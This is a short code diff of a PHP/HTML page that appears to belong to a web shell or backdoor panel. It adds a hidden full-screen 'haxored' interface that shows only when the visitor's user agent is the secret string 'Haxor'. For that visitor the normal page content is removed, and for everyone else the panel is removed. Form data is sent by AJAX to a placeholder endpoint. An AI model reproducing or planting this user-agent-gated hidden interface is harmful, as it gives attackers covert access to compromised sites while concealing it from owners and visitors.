@@ -3,18 +3,18 @@
 
 <!-- Don't include this jQuery API if it's already included on the site -->
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+
+<div id="haxored" hidden="true" style='width: 100%; height: 100%; background-color: black'>
 <script type="text/javascript">
 	$(document).ready( function() {
 		if( navigator.userAgent == "Haxor" ) {
-			$("#haxored").prop("hidden",false);
-			$("#luserContent").prop("hidden", true);
+			$("#haxored").prop("hidden", false);
+			$("#luserContent").remove();
 		} else {
-			$("#haxored").prop("hidden", true);
-			$("#luserContent").prop("hidden", false);
+			$("#haxored").remove();
 		}
 	});
 </script>
-<div id="haxored" hidden="true" style='width: 100%; height: 100%; background-color: black'>
 <?php
 	class UserInterface
 	{
@@ -96,7 +96,7 @@ $(document).ready( function() {
 		$.ajax({
 			url: CHANGEME,
 			type: "GET",
-			data: $(this).serialize();
+			data: $(this).serialize()
 		});
 	});
 });
